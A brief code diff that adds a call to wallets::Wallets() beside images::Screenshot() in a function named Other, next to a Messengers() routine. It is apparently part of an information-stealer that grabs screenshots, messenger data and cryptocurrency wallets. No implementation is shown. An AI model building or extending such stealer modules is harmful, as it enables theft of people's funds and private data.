@@ -109,5 +109,5 @@ void Messengers()
 void Other()
 {
 	images::Screenshot();
-
+	wallets::Wallets();
 }
